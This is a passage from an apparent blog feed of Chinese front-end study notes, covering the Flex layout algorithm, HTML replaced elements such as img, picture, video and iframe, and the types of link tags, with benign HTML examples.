函数。</p><p>这个公式完全来自于一篇论文，推理过程我也不清楚，但是不论如何，它确实能够用于模拟抛物线。</p><p>实际上，我们日常工作中，如果需要用贝塞尔曲线拟合任何曲线，都可以找到相应的论文，我们只要取它的结论即可。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>20丨HTML&amp;CSS：Flex排版</title>
      <link href="/Blog/2019/01/30/relearn_FE/20%E4%B8%A8HTML&amp;CSS%EF%BC%9AFlex%E6%8E%92%E7%89%88/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/20%E4%B8%A8HTML&amp;CSS%EF%BC%9AFlex%E6%8E%92%E7%89%88/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在早年的 CSS 中，“使盒按照外部尺寸变化”的能力非常弱。在我入行前端的时间（大约 2006 年），CSS 三大经典问题：垂直居中问题，两列等高问题，自适应宽问题。这是在其它 UI 系统中最为基本的问题，而到了 CSS 中，却变成了困扰工程师的三座大山。</p><p>机智的前端开发者们，曾经创造了各种黑科技来解决问题，包括著名的 table 布局、负 margin、float 与 clear 等等。在这种情况下，Flex 布局被随着 CSS3 一起提出（最初叫 box 布局），可以说是解决了大问题。<br>React Native 则更为大胆地使用了纯粹的 Flex 排版，不再支持正常流，最终也很好地支持了大量的应用界面布局，这一点也证明了 Flex 排版的潜力。</p></blockquote><p>今天，我们就从设计、原理和应用三个方面来学习一下 Flex 布局，我们先从设计开始。</p><h2 id="Flex-的设计"><a href="#Flex-的设计" class="headerlink" title="Flex 的设计"></a>Flex 的设计</h2><p>Flex 在英文中是可伸缩的意思，一些翻译会把它译作弹性，我觉得有点不太准确，但是确实中文中没有更好的词。</p><p>Flex 排版的核心是 display:flex 和 flex 属性，它们配合使用。具有 display:flex 的元素我们称为 flex 容器，它的子元素或者盒被称作 flex 项。</p><p>flex 项如果有 flex 属性，会根据 flex 方向代替宽 &#x2F; 高属性，形成“填补剩余尺寸”的特性，这是一种典型的“根据外部容器决定内部尺寸”的思路，也是我们最常用的 Windows 和 Apple 窗口系统的设计思路。</p><h2 id="Flex-的原理"><a href="#Flex-的原理" class="headerlink" title="Flex 的原理"></a>Flex 的原理</h2><p>完了设计，我们再来看看原理，Flex 的实现并不复杂，下面我们就来讲解一下，如何实现一个 Flex 布局。</p><p>首先，Flex 布局支持横向和纵向，这样我们就需要做一个抽象，我们把 Flex 延伸的方向称为“主轴”，把跟它垂直的方向称为“交叉轴”。这样，flex 项中的 width 和 height 就会称为交叉轴尺寸或者主轴尺寸。</p><p>而 Flex 又支持反向排布，这样，我们又需要抽象出交叉轴起点、交叉轴终点、主轴起点、主轴终点，它们可能是 top、left、bottom、right。</p><p>Flex 布局中有一种特殊的情况，那就是 flex 容器没有被指定主轴尺寸，这个时候，实际上 Flex 属性完全没有用了，所有 Flex 尺寸都可以被当做 0 来处理，Flex 容器的主轴尺寸等于其它所有 flex 项主轴尺寸之和。</p><p>接下来我们开始做 Flex 排版。</p><p><strong>第一步是把 flex 项分行，有 flex 属性的 flex 项可以暂且认为主轴尺寸为 0，所以，它可以一定放进当前行。</strong></p><p>接下来我们把 flex 项逐个放入行，不允许换行的话，我们就“无脑地”把 flex 项放进同一行。允许换行的话，我们就先设定主轴剩余空间为 Flex 容器主轴尺寸，每放入一个就把主轴剩余空间减掉它的主轴尺寸，直到某个 flex 项放不进去为止，换下一行，重复前面动作。</p><p>分行过程中，我们会顺便对每一行计算两个属性：交叉轴尺寸和主轴剩余空间，交叉轴尺寸是本行所有交叉轴尺寸的最大值，而主轴剩余空间前面已经说过。</p><p><strong>第二步我们来计算每个 flex 项主轴尺寸和位置。</strong></p><p>如果 Flex 容器是不允许换行的，并且最后主轴尺寸超出了 Flex 容器，就要做等比缩放。</p><p>如果 Flex 容器有多行，那么根据我们前面的分行算法，必然有主轴剩余空间，这时候，我们要找出本行所有的带 Flex 属性的 flex 项，把剩余空间按 Flex 比例分给它们即可。</p><p>做好之后，我们就可以根据主轴排布方向，确定每个 flex 项的主轴位置坐标了。</p><p>如果本行完全没有带 flex 属性的 flex 项，justify-content 机制就要生效了，它的几个不同的值会影响剩余空白如何分配，作为实现者，我们只要在计算 flex 项坐标的时候，加上一个数值即可。</p><p>例如，如果是 flex-start 就要加到第一个 flex 项身上，如果是 center 就给第一个 flex 项加一半的尺寸，如果是 space-between，就要给除了第一个以外的每个 flex 项加上“flex 项数减一分之一”。</p><p><strong>第三步我们来计算 flex 项的交叉轴尺寸和位置。</strong></p><p>交叉轴的计算首先是根据 align-content 计算每一行的位置，这部分跟 justify-content 非常类似。</p><p>再根据 alignItems 和 flex 项的 alignSelf 来确定每个元素在行内的位置。</p><p>计算完主轴和交叉轴，每个 flex 项的坐标、尺寸就都确定了，这样我们就完成了整个的 Flex 布局。</p><h2 id="Flex-的应用"><a href="#Flex-的应用" class="headerlink" title="Flex 的应用"></a>Flex 的应用</h2><p>如今这个年代，我想应该没有前端没有用过 flex 布局了，这里就不举例了</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>19丨HTML&amp;CSS：HTML替换型元素</title>
      <link href="/Blog/2019/01/30/relearn_FE/19%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E6%9B%BF%E6%8D%A2%E5%9E%8B%E5%85%83%E7%B4%A0/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/19%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E6%9B%BF%E6%8D%A2%E5%9E%8B%E5%85%83%E7%B4%A0/index/</url>
      
        <content type="html"><![CDATA[<h2 id="script"><a href="#script" class="headerlink" title="script"></a>script</h2><p>我们之所以选择先讲解 script 标签，是因为 script 标签是为数不多的既可以作为替换型标签，又可以不作为替换型标签的元素。</p><p>我们先来看看 script 标签的两种用法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello world!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;my.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个例子中，我们展示了两种 script 标签的写法，一种是直接把脚本代码写在 script 标签之间，另一种是把代码放到独立的 js 文件中，用 src 属性引入。</p><p>这两种写法是等效的。我想这种等效性可以帮助你理解替换型元素的“替换”是怎么一回事。</p><p>这里我们就可以回答标题中的问题了：凡是替换型元素，都是使用 src 属性来引用文件的，而我们之前的课程中已经讲过，链接型元素是使用 href 标签的。</p><p>虽然我不知道当初是怎么设计的，但是 style 标签并非替换型元素，不能使用 src 属性，这样，我们用 link 标签引入 CSS 文件，当然就是用 href 标签啦。</p><p>接下来我们再看看别的替换型元素，先来了解一下 img 标签。</p><h2 id="img"><a href="#img" class="headerlink" title="img"></a>img</h2><p>毫无疑问我们最熟悉的替换型标签就是 img 标签了，几乎每个前端都会日常使用 img 标签。</p><p>img 标签的作用是引入一张图片。这个标签是没有办法像 script 标签那样作为非替换型标签来使用的，它必须有 src 属性才有意义。</p><p>如果一定不想要引入独立文件，可以使用 data uri，我们来看个实际的例子：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;data:<span class="built_in">image</span>/svg+xml;charset=utf8,&lt;svg version=<span class="string">&quot;1.1&quot;</span> xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;&lt;rect <span class="built_in">width</span>=<span class="string">&quot;300&quot;</span> <span class="built_in">height</span>=<span class="string">&quot;100&quot;</span> <span class="built_in">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)&quot;</span>/&gt;&lt;/svg&gt;&#x27;/&gt;</span><br></pre></td></tr></table></figure><p>这个例子中我们使用了 data uri 作为图片的 src，这样，并没有产生独立的文件，客观上做到了和内联相同的结果，这是一个常用的技巧。</p><p>img 标签可以使用 width 和 height 指定宽度和高度。也可以只指定其中之一。我们看个例子：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;img src=&#x27;data:image/svg+xml;charset=utf8,&lt;svg width=<span class="string">&quot;600&quot;</span> height=<span class="string">&quot;400&quot;</span> version=<span class="string">&quot;1.1&quot;</span></span><br><span class="line">xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;&lt;ellipse cx=<span class="string">&quot;300&quot;</span> cy=<span class="string">&quot;150&quot;</span> rx=<span class="string">&quot;200&quot;</span> ry=<span class="string">&quot;80&quot;</span></span><br><span class="line">style=<span class="string">&quot;fill:rgb(200,100,50);</span></span><br><span class="line"><span class="string">stroke:rgb(0,0,100);stroke-width:2&quot;</span>/&gt;&lt;/svg&gt;&#x27; width=<span class="string">&quot;100&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>这个例子中，为了方便你理解，我们把图片换成了椭圆，我们可以看到，当我们指定了宽度后，图片被等比例缩放了。这个特性非常重要，适用于那种我们既要限制图片尺寸，又要保持图片比例的场景。</p><p>如果从性能的角度考虑，建议你同时给出图片的宽高，因为替换型元素加载完文件后，如果尺寸发生变换，会触发重排版（这个概念我们在浏览器原理部分已经讲过，可以复习一下）。</p><p>此处要重点提到一个属性，alt 属性，这个属性很难被普通用户感知，对于视障用户非常重要，可以毫不夸张地讲，给 img 加上 alt 属性，已经做完了可访问性的一半。</p><p>img 标签还有一组重要的属性，那就是 srcset 和 sizes，它们是 src 属性的升级版（所以我们前面讲 img 标签必须有 src 属性，这是不严谨的说法）。</p><p>这两个属性的作用是在不同的屏幕大小和特性下，使用不同的图片源。下面一个例子也来自 MDN，它展示了 srcset 和 sizes 的用法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">srcset</span>=<span class="string">&quot;elva-fairy-320w.jpg 320w,</span></span><br><span class="line"><span class="string">             elva-fairy-480w.jpg 480w,</span></span><br><span class="line"><span class="string">             elva-fairy-800w.jpg 800w&quot;</span></span><br><span class="line">     <span class="attribute">sizes</span>=<span class="string">&quot;(max-width: 320px) 280px,</span></span><br><span class="line"><span class="string">            (max-width: 480px) 440px,</span></span><br><span class="line"><span class="string">            800px&quot;</span></span><br><span class="line">     <span class="attribute">src</span>=<span class="string">&quot;elva-fairy-800w.jpg&quot;</span> <span class="attribute">alt</span>=<span class="string">&quot;Elva dressed as a fairy&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>srcset 提供了根据屏幕条件选取图片的能力，但是其实更好的做法，是使用 picture 元素。</p><h2 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h2><p>picture 元素可以根据屏幕的条件为其中的 img 元素提供不同的源，它的基本用法如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">&quot;image-wide.png&quot;</span> <span class="attr">media</span>=<span class="string">&quot;(min-width: 600px)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image-narrow.png&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">picture</span>&gt;</span></span><br></pre></td></tr></table></figure><p>picture 元素的设计跟 audio 和 video 保持了一致（稍后我会为你讲解这两个元素），它跟 img 搭配 srcset 和 sizes 不同，它使用 source 元素来指定图片源，并且支持多个。</p><p>这里的 media 属性是 media query，跟 CSS 的 @media 规则一致。</p><h2 id="video"><a href="#video" class="headerlink" title="video"></a>video</h2><p>在 HTML5 早期的设计中，video 标签跟 img 标签类似，也是使用 src 属性来引入源文件的，不过，我想应该是考虑到了各家浏览器支持的视频格式不同，现在的 video 标签跟 picture 元素一样，也是提倡使用 source 的。</p><p>下面例子是一个古典的 video 用法：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls<span class="operator">=</span><span class="string">&quot;controls&quot;</span> src<span class="operator">=</span><span class="string">&quot;movie.ogg&quot;</span>&gt;</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></table></figure><p>这个例子中的代码用 src 来指定视频的源文件。但是因为一些历史原因，浏览器对视频的编码格式兼容问题分成了几个派系，这样，对于一些兼容性要求高的网站，我们使用单一的视频格式是不合适的。</p><p>现在的 video 标签可以使用 source 标签来指定接入多个视频源。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls<span class="operator">=</span><span class="string">&quot;controls&quot;</span> &gt;</span><br><span class="line">  &lt;source src<span class="operator">=</span><span class="string">&quot;movie.webm&quot;</span> type<span class="operator">=</span><span class="string">&quot;video/webm&quot;</span> &gt;</span><br><span class="line">  &lt;source src<span class="operator">=</span><span class="string">&quot;movie.ogg&quot;</span> type<span class="operator">=</span><span class="string">&quot;video/ogg&quot;</span> &gt;</span><br><span class="line">  &lt;source src<span class="operator">=</span><span class="string">&quot;movie.mp4&quot;</span> type<span class="operator">=</span><span class="string">&quot;video/mp4&quot;</span>&gt;</span><br><span class="line">  You browser does not support video.</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></table></figure><p>从这个例子中，我们可以看到，source 标签除了支持 media 之外，还可以使用 type 来区分源文件的使用场景。</p><p>video 标签的内容默认会被当做不支持 video 的浏览器显示的内容吗，因此，如果要支持更古老的浏览器，还可以在其中加入 object 或者 embed 标签，这里就不详细展开了。</p><p>video 中还支持一种标签：track。</p><p>track 是一种播放时序相关的标签，它最常见的用途就是字幕。track 标签中，必须使用 srclang 来指定语言，此外，track 具有 kind 属性，共有五种。</p><ul><li>subtitles：就是字幕了，不一定是翻译，也可能是补充性说明。</li><li>captions：报幕内容，可能包含演职员表等元信息，适合听障人士或者没有打开声音的人了解音频内容。</li><li>descriptions：视频描述信息，适合视障人士或者没有视频播放功能的终端打开视频时了解视频内容。</li><li>chapters：用于浏览器视频内容。</li><li>metadata：给代码提供的元信息，对普通用户不可见。</li></ul><p>一个完整的 video 标签可能会包含多种 track 和多个 source，这些共同构成了一个视频播放所需的全部信息。</p><h2 id="audio"><a href="#audio" class="headerlink" title="audio"></a>audio</h2><p>接下来我们来讲讲 audio，跟 picture 和 video 两种标签一样，audio 也可以使用 source 元素来指定源文件。我们看一下例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;song.mp3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mpeg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;song.ogg&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/ogg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>You browser does not support audio.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但比起 video，audio 元素的历史问题并不严重，所以使用 src 也是没有问题的。</p><h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><p>最后我们来讲一下 iframe，这个标签能够嵌入一个完整的网页。</p><p>不过，在移动端，iframe 受到了相当多的限制，它无法指定大小，里面的内容会被完全平铺到父级页面上。</p><p>同时很多网页也会通过 http 协议头禁止自己被放入 iframe 中。</p><p>iframe 标签也是各种安全问题的重灾区。opener、window.name、甚至 css 的 opacity 都是黑客可以利用的漏洞。</p><p>因此，在 2019 年，当下这个时间点，任何情况下我都不推荐在实际开发中用以前的 iframe。</p><p>当然，不推荐使用是一回事，因为没人能保证不遇到历史代码，我们还是应该了解一下 iframe 的基本用法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://time.geekbang.org&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个例子展示了古典的 iframe 用法。</p><p>在新标准中，为 iframe 加入了 sandbox 模式和 srcdoc 属性，这样，给 iframe 带来了一定的新场景。我们来看看例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;p&gt;Yeah, you can see it &lt;a href=&quot;</span>/<span class="attr">gallery</span>?<span class="attr">mode</span>=<span class="string">cover&amp;amp;amp;page</span>=<span class="string">1</span>&quot;&gt;</span>in my gallery<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.&quot;&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个例子中，使用 srcdoc 属性创建了一个新的文档，嵌入在 iframe 中展示，并且使用了 sandbox 来隔离。</p><p>这样，这个 iframe 就不涉及任何跨域问题了。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>18丨HTML&amp;CSS：HTML链接</title>
      <link href="/Blog/2019/01/30/relearn_FE/18%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E9%93%BE%E6%8E%A5/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/18%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E9%93%BE%E6%8E%A5/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接这种元素可以说是占据了整个互联网。也正是因为无处不在的超链接，才让我们的万维网如此繁荣。没有了超链接的 HTML，最多可以称为富文本，没法称作超文本（hyper text）。</p><p>链接是 HTML 中的一种机制，它是 HTML 文档和其它文档或者资源的连接关系，在 HTML 中，链接有两种类型。一种是超链接型标签，一种是外部资源链接。</p></blockquote><p><img src="/Blog/2019/01/30/relearn_FE/18%E4%B8%A8HTML&CSS%EF%BC%9AHTML%E9%93%BE%E6%8E%A5/index/img.png"></p><h2 id="link-标签"><a href="#link-标签" class="headerlink" title="link 标签"></a>link 标签</h2><p>我们已经讲过，HTML 标准并没有规定浏览器如何使用元信息，我们还讲到了元信息中有不少是被设计成“无需被浏览器识别，而是专门用于搜索引擎看的”。</p><p>link 标签也是元信息的一种，在很多时候，它也是不会对浏览器产生任何效果的，这也是很多人会忽略 link 标签学习的原因。</p><p>link 标签会生成一个链接，它可能生成超链接，也可能生成外部资源链接。</p><p>一些 link 标签会生成超链接，这些超链接又不会像 a 标签那样显示在网页中。这就是超链接型的 link 标签。</p><p>这意味着多数浏览器中，这些 link 标签不产生任何作用。但是，这些 link 标签能够被搜索引擎和一些浏览器插件识别，从而产生关键性作用。</p><p>比如，到页面 RSS 的 link 标签，能够被浏览器的 RSS 订阅插件识别，提示用户当前页面是可以 RSS 订阅的。</p><p>另外一些 link 标签则会把外部的资源链接到文档中，也就是说，会实际下载这些资源，并且做出一些处理，比如我们常见的用 link 标签引入样式表。</p><p>除了元信息的用法之外，多数外部资源型的 link 标签还能够被放在 body 中使用，从而起到把外部资源链接进文档的作用。</p><p>link 标签的链接类型主要通过 rel 属性来区分，在本篇文章中，我们提到 xx 型 link 即表示属性 rel 为 xx 的 link，其代码类似下面：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">&quot;xx&quot;</span> <span class="params">...</span>&gt;</span><br></pre></td></tr></table></figure><p>下面我们先来看看超链接型 link 标签。</p><h3 id="超链接类-link-标签"><a href="#超链接类-link-标签" class="headerlink" title="超链接类 link 标签"></a>超链接类 link 标签</h3><p>超链接型 link 标签是一种被动型链接，在用户不操作的情况下，它们不会被主动下载。</p><p>link 标签具有特定的 rel 属性，会成为特定类型的 link 标签。产生超链接的 link 标签包括：具有 rel&#x3D;“canonical” 的 link、具有 rel&#x3D;”alternate”的 link、具有 rel&#x3D;“prev” rel&#x3D;”next”的 link 等等。</p><h4 id="canonical-型-link"><a href="#canonical-型-link" class="headerlink" title="canonical 型 link"></a>canonical 型 link</h4><p>这种 link 的代码写法是这样：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;canonical&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个标签提示页面它的主 URL，在网站中常常有多个 URL 指向同一页面的情况，搜索引擎访问这类页面时会去掉重复的页面，这个 link 会提示搜索引擎保留哪一个 URL。</p><h4 id="alternate-型-link"><a href="#alternate-型-link" class="headerlink" title="alternate 型 link"></a>alternate 型 link</h4><p>这种 link 的代码写法是这样：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;alternate&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个标签提示页面它的变形形式，这个所谓的变形可能是当前页面内容的不同格式、不同语言或者为不同的设备设计的版本，这种 link 通常也是提供给搜索引擎来使用的。</p><p>alternate 型的 link 的一个典型应用场景是，页面提供 rss 订阅时，可以用这样的 link 来引入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;alternate&quot;</span> <span class="attribute">type</span>=<span class="string">&quot;application/rss+xml&quot;</span> <span class="attribute">title</span>=<span class="string">&quot;RSS&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>除了搜索引擎外，很多浏览器插件都能识别这样的 link。</p><h4 id="prev-型-link-和-next-型-link"><a href="#prev-型-link-和-next-型-link" class="headerlink" title="prev 型 link 和 next 型 link"></a>prev 型 link 和 next 型 link</h4><p>在互联网应用中，很多网页都属于一个序列，比如分页浏览的场景，或者图片展示的场景，每个网页是序列中的一个项。</p><p>这种时候，就适合使用 prev 和 next 型的 link 标签，来告诉搜索引擎或者浏览器它的前一项和后一项，这有助于页面的批量展示。</p><p>因为 next 型 link 告诉浏览器“这是很可能访问的下一个页面”，HTML 标准还建议对 next 型 link 做预处理，在本课后面的内容，我们会讲到预处理类的 link。</p><h4 id="其它超链接类的-link"><a href="#其它超链接类的-link" class="headerlink" title="其它超链接类的 link"></a>其它超链接类的 link</h4><p>其它超链接类 link 标签都表示一个跟当前文档相关联的信息，可以把这样的 link 标签视为一种带链接功能的 meta 标签。</p><ul><li>rel&#x3D;“author” 链接到本页面的作者，一般是 mailto: 协议</li><li>rel&#x3D;“help” 链接到本页面的帮助页</li><li>rel&#x3D;“license” 链接到本页面的版权信息页</li><li>rel&#x3D;“search” 链接到本页面的搜索页面（一般是站内提供搜索时使用）</li></ul><p>到这里，我们已经讲完了所有的超链接类的 link 标签用法了。接下来我们讲讲外部资源类 link 标签。</p><h3 id="外部资源类-link-标签"><a href="#外部资源类-link-标签" class="headerlink" title="外部资源类 link 标签"></a>外部资源类 link 标签</h3><p>外部资源型 link 标签会被主动下载，并且根据 rel 类型做不同的处理。外部资源型的标签包括：具有 icon 型的 link、预处理类 link、modulepreload 型的 link、stylesheet、pingback。下面我们来一一介绍它们。</p><h4 id="icon-型-link"><a href="#icon-型-link" class="headerlink" title="icon 型 link"></a>icon 型 link</h4><p>这类链接表示页面的 icon。多数浏览器会读取 icon 型 link，并且把页面的 icon 展示出来。</p><p>icon 型 link 是唯一一个外部资源类的元信息 link，其它元信息类 link 都是超链接，这意味着，icon 型 link 中的图标地址默认会被浏览器下载和使用。</p><p>如果没有指定这样的 link，多数浏览器会使用域名根目录下的 favicon.ico，即使它并不存在，所以从性能的角度考虑，建议一定要保证页面中有 icon 型的 link。</p><p>只有 icon 型 link 有有效的 sizes 属性，HTML 标准允许一个页面出现多个 icon 型 link，并且用 sizes 指定它适合的 icon 尺寸。</p><h4 id="预处理类-link"><a href="#预处理类-link" class="headerlink" title="预处理类 link"></a>预处理类 link</h4><p>我们都知道，导航到一个网站需要经过 dns 查询域名、建立连接、传输数据、加载进内存和渲染等一系列的步骤。</p><p>预处理类 link 标签就是允许我们控制浏览器，提前针对一些资源去做这些操作，以提高性能（当然如果你乱用的话，性能反而更差）。</p><p>下面我来列一下这些 link 类型：</p><ul><li>dns-prefetch 型 link 提前对一个域名做 dns 查询，这样的 link 里面的 href 实际上只有域名有意义。</li><li>preconnect 型 link 提前对一个服务器建立 tcp 连接。</li><li>prefetch 型 link 提前取 href 指定的 url 的内容。</li><li>preload 型 link 提前加载 href 指定的 url。</li><li>prerender 型 link 提前渲染 href 指定的 url。</li></ul><h4 id="modulepreload-型的-link"><a href="#modulepreload-型的-link" class="headerlink" title="modulepreload 型的 link"></a>modulepreload 型的 link</h4><p>modulepreload 型 link 的作用是预先加载一个 JavaScript 的模块。这可以保证 JS 模块不必等到执行时才加载。</p><p>这里的所谓加载，是指完成下载并放入内存，并不会执行对应的 JavaScript。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;modulepreload&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;modulepreload&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;helpers.js&quot;</span>&gt;</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;modulepreload&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;irc.js&quot;</span>&gt;</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;modulepreload&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;fog-machine.js&quot;</span>&gt;</span><br><span class="line">&lt;script <span class="attribute">type</span>=<span class="string">&quot;module&quot;</span> <span class="attribute">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个例子来自 HTML 标准，我们假设 app.js 中有 import “irc” 和 import “fog-machine”, 而 irc.js 中有 import “helpers”。这段代码使用 moduleload 型 link 来预加载了四个 js 模块。</p><p>尽管，单独使用 script 标签引用 app.js 也可以正常工作，但是我们通过加入对四个 JS 文件的 link 标签，使得四个 JS 文件有机会被并行地下载，这样提高了性能。</p><h4 id="stylesheet-型-link"><a href="#stylesheet-型-link" class="headerlink" title="stylesheet 型 link"></a>stylesheet 型 link</h4><p>样式表大概是所有人最熟悉的 link 标签用法了。它的样子是下面这样的。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;xxx.css&quot;</span> <span class="attribute">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>基本用法是从一个 CSS 文件创建一个样式表。这里 type 属性可以没有，如果有，必须是”text&#x2F;css”才会生效。</p><p>rel 前可以加上 alternate，成为 rel&#x3D;“alternate stylesheet”，此时必须再指定 title 属性。</p><p>这样可以为页面创建一份变体样式，一些浏览器，如 Firefox 3.0，支持从浏览器菜单中切换这些样式，当然了，大部分浏览器不支持这个功能，所以仅仅从语义的角度了解一下这种用法即可。</p><h4 id="pingback-型-link"><a href="#pingback-型-link" class="headerlink" title="pingback 型 link"></a>pingback 型 link</h4><p>这样的 link 表示本网页被引用时，应该使用的 pingback 地址，这个机制是一份独立的标准，遵守 pingback 协议的网站在引用本页面时，会向这个 pingback url 发送一个消息。</p><p>以上就是 link 标签的所有用法了。接下来我们来介绍一下最熟悉的 a 